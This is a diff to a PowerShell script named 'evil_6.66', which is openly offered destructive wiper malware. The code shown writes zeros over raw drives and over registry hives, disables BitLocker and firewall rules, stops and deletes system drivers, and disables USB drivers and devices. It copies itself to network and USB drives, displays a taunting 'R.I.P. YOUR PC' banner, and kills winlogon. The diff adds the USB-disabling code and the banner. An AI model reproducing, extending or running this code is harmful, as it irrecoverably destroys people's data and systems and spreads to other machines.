@@ -1,4 +1,5 @@
 # evil_6.66
+
 param([Switch]$Force)
 if (-NOT $Force) { exit }
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -111,9 +112,19 @@ Manage-bde -off C: -Force 2>$null; Manage-bde -off D: -Force 2>$null; Manage-bde
 $drives = Get-PSDrive -PSProvider FileSystem -EA 0
 foreach ($drive in $drives) { $root = $drive.Root.Replace("\",""); if ($root -match "^[A-Z]$") { try { $raw="\\.\$root`:"; $fs=[IO.File]::OpenWrite($raw); $zero=New-Object byte[] (100MB); for($i=0;$i -lt 200;$i++) { $fs.Write($zero,0,$zero.Length); if($i%10 -eq 0){$fs.Flush()} }; $fs.Close() } catch {} } }
 
-$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","USBSTOR","USBHUB3","USBXHCI","i8042prt","kbdclass","mouclass","HID","monitor","display","BasicDisplay","BasicRender","dxgkrnl","ntfs","refs","fat","exfat","udfs","cdfs","tcpip","ndis","netbt","mrxsmb","srvnet","srv2","tdx","pciide","pcmcia","battery","cng","HdAudAddService","bthport","BTHUSB","usbvideo","dc3d","VMBus")
+$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","ntfs","refs","fat","exfat","udfs","cdfs","tcpip","ndis","netbt","mrxsmb","srvnet","srv2","tdx","pciide","pcmcia","battery","cng","HdAudAddService","bthport","BTHUSB","usbvideo","dc3d","VMBus")
 foreach ($d in $allDrivers) { Stop-CriticalDriver $d }
 Get-ChildItem "C:\Windows\System32\drivers\*.sys" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
+
+try {
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f 2>$null
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3" /v Start /t REG_DWORD /d 4 /f 2>$null
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI" /v Start /t REG_DWORD /d 4 /f 2>$null
+    Set-PendingDelete "C:\Windows\System32\drivers\USBSTOR.SYS"
+    Set-PendingDelete "C:\Windows\System32\drivers\USBHUB3.SYS"
+    Set-PendingDelete "C:\Windows\System32\drivers\USBXHCI.SYS"
+    Get-PnpDevice -Class USB -EA 0 | ForEach-Object { Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -Force -EA 0 }
+} catch {}
 
 $regHives = @("SYSTEM","SOFTWARE","SAM","SECURITY","DEFAULT")
 foreach ($hive in $regHives) { $target = "C:\Windows\System32\config\$hive"; try { $null = [IO.File]::WriteAllBytes($target, [byte[]]::new(10MB)) } catch { Set-PendingDelete $target } }
@@ -144,12 +155,77 @@ try { Get-NetFirewallRule | Disable-NetFirewallRule -EA 0 } catch {}
 try {
     $networkDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 4 }
     foreach ($netDrive in $networkDrives) { Copy-Item -LiteralPath $PSCommandPath -Destination "$($netDrive.DeviceID)\evil.ps1" -Force -EA 0 }
-    $usbDrives = Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq "USB" -or $_.InterfaceType -eq "USB" }
+    $usbDrives = Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq "USB" }
     foreach ($usb in $usbDrives) {
         $partitions = Get-Partition -DiskNumber $usb.Index -EA 0
         foreach ($part in $partitions) { if ($part.DriveLetter) { Copy-Item -LiteralPath $PSCommandPath -Destination "$($part.DriveLetter):\evil.ps1" -Force -EA 0 } }
     }
 } catch {}
+
+# ========== ПАСХАЛКИ И ФИНАЛЬНЫЕ СООБЩЕНИЯ ==========
+$asciiSkull = @"
+
+        .-"      "-.
+       /            \
+      |              |
+      |,  .-.  .-.  ,|
+      | )(__/  \__)( |
+      |/     /\     \|
+      (_     ^^     _)
+       \__|IIIIII|__/
+        | \IIIIII/ |
+        \          /
+       `--------`
+
+"@
+
+Write-Host $asciiSkull -ForegroundColor Red
+
+Write-Host @"
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║   ███████╗██╗   ██╗██╗██╗         ██████╗  ██████╗                     ║
+║   ██╔════╝██║   ██║██║██║         ██╔══██╗██╔════╝                     ║
+║   █████╗  ██║   ██║██║██║         ██████╔╝██║  ███╗                    ║
+║   ██╔══╝  ╚██╗ ██╔╝██║██║         ██╔══██╗██║   ██║                    ║
+║   ███████╗ ╚████╔╝ ██║███████╗    ██████╔╝╚██████╔╝                    ║
+║   ╚══════╝  ╚═══╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝                     ║
+║                                                                           ║
+║                    6 6 6  -  E V I L   R E A C H E D   Y O U            ║
+║                                                                           ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                           ║
+║   Your data is GONE.                                                      ║
+║   Your system is DEAD.                                                    ║
+║   Your USB ports are KILLED.                                              ║
+║   Your network is DESTROYED.                                              ║
+║   Your router is BRICKED.                                                 ║
+║                                                                           ║
+║   There is NO recovery.                                                   ║
+║   There is NO escape.                                                     ║
+║                                                                           ║
+║   You voluntarily ran this file.                                          ║
+║   You did this to yourself.                                               ║
+║                                                                           ║
+║                          R.I.P. YOUR PC                                   ║
+║                                                                           ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                    EVIL 6.6 - TOTAL ANNIHILATION                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+"@ -ForegroundColor Red
+
+for ($i = 0; $i -lt 3; $i++) {
+    [Console]::Beep(666, 500)
+    Start-Sleep -Milliseconds 200
+    [Console]::Beep(1000, 500)
+    Start-Sleep -Milliseconds 200
+    [Console]::Beep(1337, 1000)
+    Start-Sleep -Milliseconds 300
+}
+
+Write-Host "[ EVIL 6.6 ] Total annihilation completed." -ForegroundColor DarkRed
+Write-Host "[ EVIL 6.6 ] Goodbye forever." -ForegroundColor DarkRed
+Start-Sleep -Seconds 2
 
 Set-PendingDelete $PSCommandPath
 try { Stop-Process -Name "winlogon" -Force -EA 0 } catch {}
